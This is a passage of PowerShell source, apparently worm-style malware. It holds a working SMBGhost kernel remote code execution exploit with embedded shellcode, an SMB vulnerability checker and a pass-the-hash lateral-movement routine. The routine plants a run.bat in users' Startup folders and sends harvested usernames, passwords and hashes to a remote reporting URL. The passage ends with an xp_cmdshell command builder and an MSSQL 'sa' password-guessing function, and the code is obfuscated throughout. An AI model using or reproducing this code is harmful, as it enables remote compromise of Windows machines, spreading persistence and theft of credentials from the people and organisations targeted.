                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($write_request_step -lt $source_file_size_quotient)

                        {

                            if(!$NoProgress)

                            {

                                $percent_complete_calculation = [Math]::Truncate($write_request_step / $percent_complete * 100)

                                Write-Progress -Activity "[*] Uploading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation

                            }

                            $write_request_offset+=65536

                            $write_request_step++

                            $stage = 'WriteRequest'

                        }

                        elseif($write_request_step -eq $source_file_size_quotient -and $source_file_size_remainder -ne 0)

                        {

                            $write_request_length = $source_file_size_remainder

                            $write_request_offset+=65536

                            $write_request_step++

                            $stage = 'WriteRequest'

                        }

                        else

                        {

                            $action_step++

                            $set_info_request_file_info_class = 0x01

                            $set_info_request_info_level = 0x04

                            $set_info_request_buffer = $source_file_creation_time +

                                                        $source_file_last_access_time +

                                                        $source_file_last_write_time +

                                                        $source_file_last_change_time + 

                                                        0x00,0x00,0x00,0x00,

                                                        0x00,0x00,0x00,0x00

                            if(!$Modify)

                            {

                                $stage = 'SetInfoRequest'

                            }

                            else

                            {

                                $output_message = "[+] File uploaded from memory"

                                $stage = 'CloseRequest'

                            }

                        }

                    }

                }

            }

        }

    }

    catch

    {

        Write-Output "[-] $($_.Exception.Message)"

    }

    finally

    {  

        if($file_write.Handle)

        {

            $file_write.Close()

        }

        if($source_file_stream.Handle)

        {

            $source_file_binary_reader.Close()

            $source_file_stream.Close()

        }

        if($inveigh_session -and $Inveigh)

        {

            $inveigh.session_lock_table[$session] = 'open'

            $inveigh.session_message_ID_table[$session] = $message_ID

            $inveigh.session[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}

        }

        if(!$inveigh_session -or $Logoff)

        {

            $client.Close()

            $client_stream.Close()

        }

    }

}

    if(!$Modify -or $Action -eq 'Put')

    {

        Write-Output $output_message

    }

    elseif($output_message)

    {

        Write-Verbose $output_message

    }

}

function smbghost_check($tip) {

    function check_vul($sock) {

        $ret = 0

        [Byte[]] $pkt = @()

        $pkt += 0x00,0x00,0x00,0xC4,0xFE,0x53,0x4D,0x42,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x24,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0x01,0x02,0xAB,0xCD,0x01,0x02,0xAB,0xCD,0x01,0x02,0xAB,0xCD,0x01,0x02,0xAB,0xCD,0x78,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x02,0x02,0x10,0x02,0x22,0x02,0x24,0x02,0x00,0x03,0x02,0x03,0x10,0x03,0x11,0x03,0x00,0x00,0x00,0x00,0x01,0x00,0x26,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x20,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x0E,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x02,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

        $sock.Send($pkt)|out-null

        $nb = [Array]::CreateInstance(('byt'+'e'), 4)

        $recv = $sock.Receive($nb)

        $len = [bitconverter]::ToUInt16($nb[4..2],0)

        $res = [Array]::CreateInstance(('byt'+'e'), $len)

        $recv = $sock.Receive($res)

        if($res[68] -eq 0x11 -and $res[69] -eq 0x03 -and $res[70] -eq 0x02 -and $res[71] -eq 0x00){

            $ret = 1

            write-host "VUl."

        }

        return $ret

    }

    try{

        $client = NE`W-`obj`EcT System.Net.Sockets.TcpClient($target,445)

    }catch{

        return $false

    }

    $sock = $client.Client

    $ret = check_vul $sock

    $sock.Close() | out-null

    return $ret

}

$lznt1source=@'

using System;

using System.Collections.Generic;

namespace Compression

{ 

    public class LzWindowDictionary

    {

        private List<int>[] _offsetList;

        public LzWindowDictionary()

        {

            Initalize();

            _offsetList = new List<int>[0x100];

            for (int i = 0; i < _offsetList.Length; i++)

            {

                _offsetList[i] = new List<int>();

            }

        }

        public int MinMatchAmount = 0;

        public int MaxMatchAmount = 0;

        private int BlockSize = 0;

        public void Reset()

        {

            Initalize();

            for (int i = 0; i < _offsetList.Length; i++)

            {

                _offsetList[i].Clear();

            }

        }

        public int[] Search(byte[] decompressedData, int decompressedDataOffset, uint index, uint length)

        {

            RemoveOldEntries(decompressedData[decompressedDataOffset + index]); // Remove old entries for this index 

            int[] match = new int[] { 0, 0 };

            if (index < 1 || length - index < MinMatchAmount)

            {

                return match;

            }

            for (int i = 0; i < _offsetList[decompressedData[decompressedDataOffset + index]].Count; i++)

            {

                int matchStart = _offsetList[decompressedData[decompressedDataOffset + index]][i];

                int matchSize = 1;

                if (index - matchStart > BlockSize)

                {

                    break;

                }

                int maxMatchSize = (int)Math.Min(Math.Min(MaxMatchAmount, BlockSize), Math.Min(length - index, length - matchStart));

                while (matchSize < maxMatchSize && decompressedData[decompressedDataOffset + index + matchSize] == decompressedData[decompressedDataOffset + matchStart + matchSize])

                {

                    matchSize++;

                }

                if (matchSize >= MinMatchAmount && matchSize > match[1])

                {

                    match = new int[] { (int)(index - matchStart), matchSize };

                    if (matchSize == MaxMatchAmount)

                    {

                        break;

                    }

                }

            }

            return match;

        }

        public void AddEntry(byte[] decompressedData, int decompressedDataOffset, int index)

        {

            _offsetList[decompressedData[decompressedDataOffset + index]].Add(index);

        }

        public void AddEntryRange(byte[] decompressedData, int decompressedDataOffset, int index, int length)

        {

            for (int i = 0; i < length; i++)

            {

                AddEntry(decompressedData, decompressedDataOffset, index + i);

            }

        }

        private void Initalize()

        {

            MinMatchAmount = 3;

            MaxMatchAmount = 18;

            BlockSize = 4096;

        }

        private void RemoveOldEntries(byte index)

        {

            while (_offsetList[index].Count > 256)

            {

                _offsetList[index].RemoveAt(0);

            }

        }

    }

    public class LZNT1

    {

        private const ushort SubBlockIsCompressedFlag = 0x8000;

        private const ushort SubBlockSizeMask = 0x0fff;

        private const int FixedBlockSize = 0x1000;

        private static byte[] s_compressionBits = CalcCompressionBits();

        private static int BlockSize = 4096;

        public int Compress(byte[] source, ref byte[] compressed, bool isevil)

        {

            uint sourcePointer = 0;

            uint sourceCurrentBlock = 0;

            uint destPointer = 0;

            int sourceOffset = 0;

            int sourceLength = source.Length;

            int compressedLength = compressed.Length;

            int compressedOffset = 0;

            LzWindowDictionary lzDictionary = new LzWindowDictionary();

            bool nonZeroDataFound = false;

            for (int subBlock = 0; subBlock < sourceLength; subBlock += BlockSize)

            {

                lzDictionary.MinMatchAmount = 3;

                sourceCurrentBlock = sourcePointer;

                uint decompressedSize = (uint)Math.Min(sourceLength - subBlock, BlockSize);

                uint compressedSize = 0;

                uint headerPosition = destPointer;

                compressed[compressedOffset + destPointer] = compressed[compressedOffset + destPointer + 1] = 0;

                destPointer += 2;

                while (sourcePointer - subBlock < decompressedSize)

                {

                    if (destPointer + 1 >= compressedLength)

                    {

                        return -1;

                    }

                    byte bitFlag = 0x0;

                    uint flagPosition = destPointer;

                    compressed[compressedOffset + destPointer] = bitFlag; // It will be filled in later 

                    compressedSize++;

                    destPointer++;

                    for (int i = 0; i < 8; i++)

                    {

                        int lengthBits = 16 - s_compressionBits[sourcePointer - subBlock];

                        ushort lengthMask = (ushort)((1 << s_compressionBits[sourcePointer - subBlock]) - 1);

                        lzDictionary.MaxMatchAmount = Math.Min(1 << lengthBits, BlockSize - 1);

                        int[] lzSearchMatch = lzDictionary.Search(source, sourceOffset + subBlock, (uint)(sourcePointer - subBlock), decompressedSize);

                        if (lzSearchMatch[1] > 0)

                        {

                            if (destPointer + 2 >= compressedLength)

                            {

                                return -1;

                            }

                            bitFlag |= (byte)(1 << i);

                            int rawOffset = lzSearchMatch[0];

                            int rawLength = lzSearchMatch[1];

                            int convertedOffset = (rawOffset - 1) << lengthBits;

                            int convertedSize = (rawLength - 3) & ((1 << lengthMask) - 1);

                            ushort convertedData = (ushort)(convertedOffset | convertedSize);

                            WriteBytesLittleEndian(convertedData, compressed, compressedOffset + (int)destPointer);

                            lzDictionary.AddEntryRange(source, sourceOffset + subBlock, (int)(sourcePointer - subBlock), lzSearchMatch[1]);

                            sourcePointer += (uint)lzSearchMatch[1];

                            destPointer += 2;

                            compressedSize += 2;

                        }

                        else

                        {

                            if (destPointer + 1 >= compressedLength)

                            {

                                return -1;

                            }

                            bitFlag |= (byte)(0 << i);

                            if (source[sourceOffset + sourcePointer] != 0)

                            {

                                nonZeroDataFound = true;

                            }

                            compressed[compressedOffset + destPointer] = source[sourceOffset + sourcePointer];

                            lzDictionary.AddEntry(source, sourceOffset + subBlock, (int)(sourcePointer - subBlock));

                            sourcePointer++;

                            destPointer++;

                            compressedSize++;

                        }

                        if (sourcePointer - subBlock >= decompressedSize)

                        {

                            break;

                        }

                    }

                    compressed[compressedOffset + flagPosition] = bitFlag;

                }

                if (compressedSize >= BlockSize && !isevil)

                {

                    WriteBytesLittleEndian((ushort)(0x3000 | (BlockSize - 1)), compressed, compressedOffset + (int)headerPosition);

                    Array.Copy(source, sourceOffset + sourceCurrentBlock, compressed, compressedOffset + headerPosition + 2, BlockSize);

                    destPointer = (uint)(headerPosition + 2 + BlockSize);

                    compressed[destPointer] = 0;

                    compressed[destPointer + 1] = 0;

                }

                else

                {

                    WriteBytesLittleEndian((ushort)(0xb000 | (compressedSize - 1)), compressed, compressedOffset + (int)headerPosition);

                    if(isevil){

                        compressed[destPointer] = 0x37;

                        compressed[destPointer + 1] = 0x13;

                        destPointer += 2;

                    }

                }

                lzDictionary.Reset();

            }

            if (nonZeroDataFound)

            {

                compressedLength = (int)destPointer;

                return compressedLength;

            }

            else

            {

                compressedLength = 0;

                return 0;

            }

        }

        private static byte[] CalcCompressionBits()

        {

            byte[] result = new byte[4096];

            byte offsetBits = 0;

            int y = 0x10;

            for (int x = 0; x < result.Length; x++)

            {

                result[x] = (byte)(4 + offsetBits);

                if (x == y)

                {

                    y <<= 1;

                    offsetBits++;

                }

            }

            return result;

        }

        public static void WriteBytesLittleEndian(ushort val, byte[] buffer, int offset)

        {

            buffer[offset] = (byte)(val & 0xFF);

            buffer[offset + 1] = (byte)((val >> 8) & 0xFF);

        }

        public static ushort ToUInt16LittleEndian(byte[] buffer, int offset)

        {

            return (ushort)(((buffer[offset + 1] << 8) & 0xFF00) | ((buffer[offset + 0] << 0) & 0x00FF));

        }

    }

}

'@

aD`d-TY`pe -TypeDefinition $lznt1source 

function smbghost_exec($ip,$cmd){

    function unpack($pkt_str) {

        [Byte[]]$pkt = for($i=0; $i -lt $pkt_str.length; $i+=2) 

        { 

         [Byte][int]::Parse($pkt_str.substring($i,2),'HexNumber') 

        } 

        return $pkt

    }

    function pack($pkt) {

        $pkt | foreach{$s+=$_.ToString("x2")}

        return $s

    }

    $global:PML4 = 0

    $global:PHAL_HEAP = 0

    $global:PML4_SELFREF = 0

    $global:PHALP_INTERRUPT = 0

    $global:PHALP_APIC_INTERRUPT = 0

    $global:KERNEL_SHELLCODE = unpack "4150415141554157415651525356574c8d35b5020000498b86d8000000498b9ee0000000488918fb4831c9440f22c1b9820000c00f322500f0ffff48c1e2204801d0482d001000006681384d5a75f34989c74d893ebf787cf4dbe8e40000004989c5bf3f5f6477e8380100004889c1bfe1140117e82b0100004889c24883c208498d740d00e8090100003dd883e03e740a4d8b6c15004929d5ebe5bf48b818b84c89e9e89b000000498946084d8b45304d8b4d384981e8f80200004831f64981e9f8020000418b79740fbae70473054c89ceeb0c4d39c84d8b890003000075de4885f67449498d4e104889f24d31c04c8d0dc200000052415041504150bfc45c196d4883ec20e8380000004883c440498d4e10bf3446ccaf4883ec20b805000000440f22c0e8190000004883c420fa4889d85f5e5b5a59415e415f415d41594158ffe0e802000000ffe0535156418b473c4c01f88b80880000004c01f8508b48188b58204c01fbffc98b348b4c01fee81f00000039f875ef588b58244c01fb668b0c4b8b581c4c01fb8b048b4c01f85e595bc35231c099acc1ca0d01c285c075f6925ac3e8a1ffffff8078028077050fb64003c38b4003c3415741565756488b050e010000488b4818488b4920488b09668379481875f6488b415081780c3300320075e94c8b7920bf5e515e83e858ffffff4989c64c8b3dcf00000031c0488d159601000089c148f7d14989c0b04050c1e006504989014883ec20bfea996e57e81effffff4883c430488b3d6b010000488d3577000000b91d000000f3a4488d356e010000b958020000f3a4488d0de000000065488b1425880100004d31c04c8d0d4600000041506a01488b052a0100005041504883ec20bfc45c196de8c1feffff4883c440488d0da60000004c89f24d31c9bf3446ccaf4883ec20e8a2feffff4883c4205e5f415e415fc390c3489231c951514989c94c8d050d00000089ca4883ec20ffd04883c430c3585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858580000000000000000"

    $global:USER_PAYLOAD = unpack "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5636d64202f63206563686f206f6b203e633a2f732e747800"

    function reconnect(){

        try{

            $client = NEW-objEcT Net.Sockets.TcpClient($ip,445)

            $sock = $client.Client

        }catch{

            write-host("[*] Cannot connect to ${ip}:445")

        }

        return $sock

    }

    function sock_recv($sock) {

        $sock.ReceiveTimeout = 5000

        try{

            $res = [Array]::CreateInstance(('byt'+'e'), 1000)

            $recv = $sock.Receive($res)

            return $res[0..($recv-1)]

        }catch{

            write-host("[*] Cannot receive data from remote")

            return $false

        }

    }

    function smb_negotiate($sock){

        $pkt_str='000000b2fe534d424000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002400050000000000440000001337c0de1337c0de1337c0de1337c0de700000000200000002021002000302031103000001002600000000000100200001000000000000000000000000000000000000000000000000000000000000000000000003000a000000000001000000010000000100'

        $pkt=unpack $pkt_str

        $sock.send($pkt)

    }

    function Smb2CompressedTransform($compressed_data, $decompressed_size, $data){

        $pkt = @(0xfc,0x53,0x4d,0x42)

        $pkt += [bitconverter]::GetBytes($decompressed_size)

        $pkt += @(0x01,0x00,0x00,0x00)

        $pkt += [bitconverter]::GetBytes($data.length)

        $pkt += $data + $compressed_data

    }

    function smb_compress($sock, $compressed_data, $decompressed_size, $data){

        $comp_bytes = @(0xfc,0x53,0x4d,0x42)

        $comp_bytes += [bitconverter]::GetBytes($decompressed_size)

        $comp_bytes += @(0x01,0x00,0x00,0x00)

        $comp_bytes += [bitconverter]::GetBytes($data.length)

        $comp_bytes += $data + $compressed_data

        $compressed_packet = @(0x00) + [bitconverter]::GetBytes($comp_bytes.length)[2..0] + $comp_bytes

        $sock.send($compressed_packet)

    }

    function MDL($phys_addr){

        $pkt_str='000000000000000048001c500000000000000000000000000008000080f7ffff0000000080f7ffff58020000'

        $phys_addr_enc = ($phys_addr -band 0xFFFFFFFFFFFFF000)/4096

        $pkt = unpack $pkt_str

        $pkt += [bitconverter]::GetBytes([int]($phys_addr -band 0xFFF)+0x4)

        $pkt += [bitconverter]::GetBytes([int64]$phys_addr_enc)*3

        return $pkt

    }

    function write_primitive($data,$addr){

        $sock = reconnect

        if($sock -eq $null){

            return $false

        }

        smb_negotiate $sock | out-null

        sock_recv $sock | out-null

        $uncompressed_data = @(0x41)*(0x1100-$data.length)

        $uncompressed_data += @(0x00)*0x18

        $uncompressed_data += [bitconverter]::GetBytes([int64]$addr)

        $compressed_data = @(0x00) * [math]::max($uncompressed_data.length,100)

        $compressed_length=(new-object Compression.LZNT1).Compress($uncompressed_data,[ref]$compressed_data,$false)

        $compressed_data = $compressed_data[0..($compressed_length-1)]

        smb_compress $sock $compressed_data 0xFFFFFFFF $data | out-null

        $sock.close()

    }

    function write_srvnet_buffer_hdr($data, $offset){

        $sock = reconnect

        if($sock -eq $null){

            return $false

        }

        smb_negotiate $sock | out-null

        sock_recv $sock | out-null

        $compressed_data = @(0x00) * [math]::max($data.length,100)

        $compressed_length=(new-object Compression.LZNT1).Compress($data,[ref]$compressed_data,$true)

        $compressed_data = $compressed_data[0..($compressed_length-1)]

        $dummy_data = @(0x33)*(0x1100+$offset)

        smb_compress $sock $compressed_data 0xFFFFEFFF $dummy_data | out-null

        $sock.close()

    }

    function read_physmem_primitive($phys_addr){

        $retry=3

        while($retry-- -gt 0){

            $fake_mdl = MDL $phys_addr

            $flag33 = write_primitive $fake_mdl (0xFFFFF78000000000+0x900)

            if($flag33 -eq $false){return}

            $flag33=write_srvnet_buffer_hdr ([bitconverter]::GetBytes([int64](0xFFFFF78000000000+0x900))) 0x38

            if($flag33 -eq $false){return}

            $retry1=3

            while($retry1-- -gt 0){

                $sock = reconnect

                if($sock -eq $null){

                    return

                }

                smb_negotiate $sock | out-null

                $buff = sock_recv $sock

                $sock.close() | out-null

                if(compare $buff[4..7] @(0xfe,0x53,0x4d,0x42)){

                    return $buff

                }

            }

        }

    }

    function get_phys_addr($va_addr){

        $pml4_index = 511 -band ([math]::floor($va_addr/[math]::pow(2,39)))

        $pdpt_index = 511 -band ([math]::floor($va_addr/[math]::pow(2,30)))

        $pdt_index = 511 -band ([math]::floor($va_addr/[math]::pow(2,21)))

        $pt_index = 511 -band ([math]::floor($va_addr/[math]::pow(2,12)))

        $pml4e = $global:PML4 + $pml4_index*0x8

        $pdpt_buff = read_physmem_primitive $pml4e

        if($pdpt_buff -eq $null){

            write-host("[-] physical read primitive failed")

            return

        }

        $pdpt = [bitconverter]::toint64($pdpt_buff[0..7],0) -band 4294963200

        $pdpte = $pdpt + $pdpt_index*0x8

        $pdt_buff = read_physmem_primitive $pdpte

        if($pdt_buff -eq $null){

            write-host("[-] physical read primitive failed")

            return

        }

        $pdt = [bitconverter]::toint64($pdt_buff[0..7],0) -band 4294963200

        $pdte = $pdt + $pdt_index*0x8

        $pt_buff = read_physmem_primitive $pdte

        if($pt_buff -eq $null){

            write-host("[-] physical read primitive failed")

            return

        }

        $pt = [bitconverter]::toint64($pt_buff[0..7],0)

        if($pt -band 128){

            $phys_addr = ($pt -band 4294963200) + ($pt_index -band 0xFFF)*0x1000 + ($va_addr -band 0xFFF)

            return $phys_addr

        } else {

            $pt = $pt -band 4294963200

        }

        $pte = $pt + $pt_index*0x8

        $pte_buff = read_physmem_primitive $pte

        if($pte_buff -eq $null){

            write-host("[-] physical read primitive failed")

            return

        }

        $phys_addr = ([bitconverter]::toint64($pte_buff[0..7],0) -band 4294963200) + ($va_addr -band 0xFFF)

        return $phys_addr

    }

    function get_pte_va($addr){

        $pt = 36028778765352960

        $lb = 0xFFFF000000000000 -bor ($global:PML4_SELFREF * [math]::pow(2,39))

        $ub = (0xFFFF000000000000 -bor ($global:PML4_SELFREF * [math]::pow(2,39) + 0x8000000000 - 1)) -band 0xFFFFFFFFFFFFFFF8

        $pt = $pt -bor $lb

        $pt = $pt -band $ub

        return $pt

    }

    function overwrite_pte($addr){

        $phys_addr = get_phys_addr $addr

        $buff = read_physmem_primitive $phys_addr

        if($buff -eq $null){

            write-host("[-] read primitive failed!")

            return $false

        }

        $pte_val = [bitconverter]::toint64($buff[0..7],0)

        $overwrite_val = $pte_val -band 9223372036854775807

        $overwrite_buff = [bitconverter]::GetBytes([int64]$overwrite_val)

        write_primitive $overwrite_buff $addr

    }

    function build_shellcode(){

        $global:KERNEL_SHELLCODE += [bitconverter]::GetBytes([int64]($global:PHALP_INTERRUPT+0x78))

        $global:KERNEL_SHELLCODE += [bitconverter]::GetBytes([int64]$global:PHALP_APIC_INTERRUPT)

        $global:KERNEL_SHELLCODE += $global:USER_PAYLOAD

    }

    function search_hal_heap(){

        $search_len = 0x10000

        $index = $global:PHAL_HEAP

        $page_index = $global:PHAL_HEAP

        $cons = 0

        $phys_addr = 0

        while($index -lt ($global:PHAL_HEAP + $search_len)){

            if(-not ($index -band $0xFFF)){

                $phys_addr = get_phys_addr $index

                if($phys_addr -eq $null){

                    return $false

                }

            } else {

                $phys_addr = ($phys_addr -band 0xFFFFFFFFFFFFF000) + ($index -band 0xFFF)

            }

            $buff = read_physmem_primitive $phys_addr

            if($buff -eq $null){

                write-host("[-] physical read primitive failed!")

                return $false

            }

            [int]$entry_indices = 8*([math]::floor(($buff.length+4)/8)-1)

            $i = 0

            while($i -lt $entry_indices){

                $entry = [bitconverter]::toint64($buff[$i..($i+7)],0)

                $i += 8

                if(($entry -band 0xFFFFFF0000000000) -ne 0xFFFFF80000000000){

                    $cons = 0

                    continue

                }

                $cons += 1

                if($cons -gt 3){

                    $global:PHALP_INTERRUPT = $index + $i - 0x40

                    write-host("[+] found HalpInterruptController at 0x{0:x}" -f $global:PHALP_INTERRUPT)

                    if($buff.length -lt ($i+0x40)){

                        $buff = read_physmem_primitive ($phys_addr + $i + 0x38)

                        $global:PHALP_APIC_INTERRUPT = [bitconverter]::toint64($buff[0..7],0)

                        if($buff -eq $null){

                            write-host("[-] physical read primitive failed!")

                            return $false

                        }

                    } else {

                        $global:PHALP_APIC_INTERRUPT = [bitconverter]::toint64($buff[($i+0x38)..($i+0x3f)],0)

                    }

                    write-host("[+] found HalpApicRequestInterrupt at 0x{0:x}" -f $global:PHALP_APIC_INTERRUPT)

                    return $true

                }

            }

            $index += $entry_indices

        }

        write-host("[-] failed to find HalpInterruptController!")

    }

    function search_selfref(){

        $search_len = 0x1000

        $index = $global:PML4

        while($search_len){

            $buff = read_physmem_primitive $index

            if($buff -eq $null){

                return

            }

            [int]$entry_indices = 8*([math]::floor(($buff.length+4)/8)-1)

            $i = 0

            while($i -lt $entry_indices){

                $entry = [bitconverter]::toint64($buff[$i..($i+7)],0) -band 4294963200

                if($entry -eq $global:PML4){

                    return ($index+$i)

                }

                $i += 8

            }

            $search_len -= $entry_indices

            $index += $entry_indices

        }

    }

    function find_pml4_selfref(){

        $self_ref = search_selfref

        if($self_ref -eq $null){

            write-host("[-] failed to find PML4 self reference entry!")

            return $false

        }

        [int]$global:PML4_SELFREF = [math]::floor(($self_ref -band 0xFFF)/8)

        write-host("[+] found PML4 self-ref entry {0:x}" -f ($global:PML4_SELFREF))

        return $true

    }

    function find_low_stub(){

        $limit = 0x100000

        $index = 0x1000

        while($index -lt $limit){

            $buff1 = read_physmem_primitive $index

            if($buff1 -eq $null){

                write-host("[-] physical read primitive failed!")

                return $false

            }

            $entry = [bitconverter]::toint64($buff1[0..7],0) -band 0xFFFFFFFFFFFF00FF

            if($entry -eq 0x1000600E9){

                write-host("[+] found low stub at phys addr 0x{0:x}!" -f $index)

                $global:PML4 = [bitconverter]::toint64($buff1[160..167],0)

                write-host("[+] PML4 at 0x{0:x}" -f $global:PML4)

                $global:PHAL_HEAP = [bitconverter]::toint64($buff1[120..127],0) -band 0xFFFFFFFFF0000000

                write-host("[+] base of HAL heap at 0x{0:x}" -f $global:PHAL_HEAP)

                return $true

            }

            $index += 0x1000

        }

        write-host("[-] Failed to find low stub in physical memory!")

    }

    function do_rce(){

        $flag = find_low_stub

        if($flag -ne $true){

            return $false

        }

        $flag1 = find_pml4_selfref

        if($flag1 -ne $true){

            return $false

        }

        $flag2 = search_hal_heap

        if($flag2 -ne $true){

            return $false

        }

        build_shellcode

        write-host("[+] built shellcode!")

        $pKernelUserSharedPTE = get_pte_va

        write-host("[+] KUSER_SHARED_DATA PTE at 0x{0:x}" -f $pKernelUserSharedPTE)

        $flag3 = overwrite_pte $pKernelUserSharedPTE

        if($flag3 -eq $false){

            return $false

        }

        write-host("[+] KUSER_SHARED_DATA PTE NX bit cleared!")

        $to_write = $global:KERNEL_SHELLCODE.length

        $write_bytes = 0

        while($write_bytes -lt $to_write){

            $write_sz = [math]::min(0xd0, $to_write - $write_bytes)

            write_primitive $global:KERNEL_SHELLCODE[$write_bytes..($write_bytes + $write_sz-1)] (0xFFFFF78000000000+0x950+$write_bytes)

            $write_bytes += $write_sz

        }

        write-host("[+] Wrote shellcode at 0x{0:x}!" -f (0xFFFFF78000000000+0x950))

        write_primitive ([bitconverter]::GetBytes([int64](0xFFFFF78000000000+0x950))) ($global:PHALP_INTERRUPT + 0x78)

        write-host("[+] overwrote HalpInterruptController pointer, should have execution shortly...")

        return $true

    }

    if($cmd -ne $null){

        $global:USER_PAYLOAD = $global:USER_PAYLOAD[0..266] + [Text.Encoding]::ASCII.GetBytes($cmd) +@(0x00)

    }

    do_rce

}

function copyrun {   

    Param(

    [parameter(Mandatory=$true)][String]$ip,

    [parameter(Mandatory=$true)][String]$thedomain,

    [parameter(Mandatory=$true)][String]$user,

    [parameter(Mandatory=$true)][String]$cmd

    )

    if($thedomain -eq 'localhost'){

        $ipchash = $allhash

    }else{

        $ipchash = $gethashs

    }

    for($i = 0; $i -lt $ipchash.Count; $i++){

        try{

            $list_rst = ""

            $list_rst = Invoke-SMBC -Domain $thedomain -Username $user -Hash $ipchash[$i] -Action List -Source \\$ip\users -verbose

            if($list_rst.IndexOf("failed to authenticate") -eq -1){

                try{    

                    $exec_rst=""

                    if($thedomain -eq 'localhost'){

                        if($i -lt $allpass.count){

                            $currpass = $allpass[$i]

                        } else { 

                            $currpass = "unknown"

                        }

                    }else{

                        $currpass = $getpasswd[$i]

                    }

                    write-host $currpass

                    $internet_ip = (Test-Connection -ComputerName $env:computername -count 1).ipv4address.IPAddressToString

                    $exec_rst = Invoke-SE -Target $ip -Domain $thedomain -Username $user -Hash $ipchash[$i] -Command $cmd 

                    write-host $exec_rst

                    if($exec_rst.IndexOf("Command executed") -ne -1){

                        try{(New-Object Net.WebClient).DownloadString($down_url+'/report.json?v='+$VVERSION+'&type=ipc&iip='+$internet_ip+'&ip='+$ip+'&domain='+$thedomain+'&user='+$user+'&pass='+$currpass+'&passhash='+$ipchash[$i]+'&t='+$t)}catch{}

                        return    

                    }                   

                }catch{

                }

                $list_rst = Invoke-SMBC -Domain $thedomain -Username $user -Hash $ipchash[$i] -Action "List" -Source \\$ip\c$\users -verbose

                $list_rst

                $users=@()

                $items=$list_rst.split("\")

                for($j=5;$j -lt $items.length;$j+=5){

                $items1=$items[$j].split("`n")

                if($items1.length -eq 2){

                    $user1=$items1[0].trim()

                }

                if($items1.length -eq 3){

                    $user1=$items1[0].trim()+$items1[1].trim()

                }

                $users+=$user1

                }

                $users=$users|select -uniq

                $users

                for ($k=0; $k -lt $users.Count; $k++ ){

                    $bat_path = "\\$ip\c$\users\"+$users[$k].trim()+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat' 

                    Invoke-SMBC -Domain $domain -Username $user -Hash $ipchash[$i] -Action Delete -Source "$bat_path"

                    Invoke-SMBC -Domain $domain -Username $user -Hash $ipchash[$i] -Action Put -Source $byte_bat -Destination "$bat_path" -Modify

                }

                break

            }

        }catch{}

    }

}

function db_query{

    Param(

    [parameter(Mandatory=$true)][System.Data.SqlClient.SqlConnection]$sqlconnection,

    [parameter(Mandatory=$true)][String]$sqlcommand

    )

    $SqlCmd = New-Object System.Data.SqlClient.SqlCommand

    $SqlCmd.CommandText = $sqlcommand

    $SqlCmd.Connection = $SqlConnection 

    $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter

    $SqlAdapter.SelectCommand = $SqlCmd 

    $DataSet = New-Object System.Data.DataSet

    $SqlAdapter.Fill($DataSet) | out-null

    #$DataSet.Tables[0] | Format-Table -Auto

    return $DataSet.Tables[0].Rows[0]

}

function db_gencmd{

    Param(

    [parameter(Mandatory=$true)][String]$rawcmd

    )

    $sqlcmd = ""

    $m_count = [Math]::Ceiling($cmd.length/128)

    for($i=0;$i -lt $m_count;$i++){

        $sqlcmd += "DECLARE @cmd$i VARCHAR(256)='"+$rawcmd.substring($i*128,[math]::min(128,$cmd.length-$i*128)).replace("'","''")+"';"

    }

    $sqlcmd += "DECLARE @cmd VARCHAR(2000)=@cmd0"

    for($i=1;$i -lt $m_count;$i++){

        $sqlcmd += "+@cmd$i"

    }

    $sqlcmd += ";exec xp_cmdshell @cmd"

    return $sqlcmd

}

function mssqlrun {

    Param(

    [parameter(Mandatory=$true)][String]$ip,

    [parameter(Mandatory=$true)][String]$pass,

    [parameter(Mandatory=$true)][String]$cmd,

    [parameter(Mandatory=$false)][String]$cmd1

    )

    $banner=""

    $SqlConnection = New-Object System.Data.SqlClient.SqlConnection

    $SqlConnection.ConnectionString = "Server = $ip; Database = master ; User ID= sa; Password= $pass" 

    try{

        $sqlconnection.open()|out-null

        write-host "Get sa pass:$pass"

    }catch{

        write-host($ERROR[0])

        return $false,$banner

    }   

    try{

